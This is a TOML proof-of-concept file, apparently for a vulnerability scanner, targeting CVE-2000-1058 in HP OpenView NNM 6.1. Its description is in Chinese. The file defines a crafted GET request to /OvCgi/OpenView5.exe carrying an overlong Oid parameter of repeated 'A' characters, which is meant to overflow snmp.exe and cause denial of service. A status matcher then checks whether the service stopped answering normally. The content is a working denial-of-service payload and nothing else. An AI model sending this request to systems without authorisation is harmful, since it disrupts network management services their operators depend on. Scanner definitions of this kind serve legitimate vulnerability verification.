[info]
author = "ave"
description = "HP OpenView NNM 6.1 及更早版本 OverView5 CGI 缓冲区溢出远程拒绝服务漏洞验证。通过向 OpenView5.exe 发送包含 136 字节超长 Oid 参数的特制 GET 请求，触发 snmp.exe 服务缓冲区溢出导致拒绝服务。"
id = "POC-AVE-2000-0767"
name = "CVE-2000-1058 PoC"
severity = "medium"
tags = ["cve-2000-1058"]
vuln_id = [
    "CVE-2000-1058",
    "AVE-2000-0767",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/OvCgi/OpenView5.exe?Context=Snmp&Action=Snmp&Host=&Oid=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
protocol = "http"

[[poc.requests.matchers]]
expect = false
status = [200]
type = "status"
